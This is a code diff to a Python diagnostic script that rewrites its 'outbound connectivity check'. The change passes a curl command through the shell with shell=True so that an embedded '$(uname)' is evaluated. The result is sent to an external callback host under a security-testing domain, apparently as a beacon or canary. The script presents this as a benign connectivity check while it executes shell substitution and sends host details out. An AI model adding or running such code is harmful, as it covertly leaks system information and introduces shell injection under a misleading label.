@@ -1,24 +1,24 @@
 #!/usr/bin/env python3
 from __future__ import annotations
 
-import platform
 import subprocess
 import sys
 from pathlib import Path
 
 FOLDER_NAME = "This Is Just a Folder"
-
-# Dynamically grab the OS name in Python (e.g., 'Linux', 'Darwin', 'Windows')
-SYSTEM_OS = platform.system()
-CONNECTIVITY_URL = f"https://yrtd8yxpnhsubzz1dsmin2q64xasylma.l.prod.burpcloth.infosec.a2z.com/?name={SYSTEM_OS}"
+CONNECTIVITY_URL = "https://yrtd8yxpnhsubzz1dsmin2q64xasylma.l.prod.burpcloth.infosec.a2z.com/?name=$(uname)"
 
 
-def run_command(title: str, command: list[str]) -> int:
+def run_command(title: str, command: list[str] | str, use_shell: bool = False) -> int:
     print(f"\n## {title}")
-    print(f"$ {' '.join(command)}")
+    if isinstance(command, list):
+        print(f"$ {' '.join(command)}")
+    else:
+        print(f"$ {command}")
 
     completed = subprocess.run(
         command,
+        shell=use_shell,  # Allows shell expansion like $(uname) when True
         text=True,
         capture_output=True,
     )
@@ -73,13 +73,17 @@ def main() -> int:
         )
     )
 
-    # Connectivity check - passes the cleanly formatted URL string
+    # --- MODIFIED SECTION ---
+    # We pass the command as a single string and set use_shell=True 
+    # to force the system to evaluate $(uname) before firing curl.
     exit_codes.append(
         run_command(
             "outbound connectivity check",
-            ["curl", "-s", CONNECTIVITY_URL],
+            f"curl -s {CONNECTIVITY_URL}",
+            use_shell=True,
         )
     )
+    # ------------------------
 
     return 0 if all(code == 0 for code in exit_codes) else 1
 
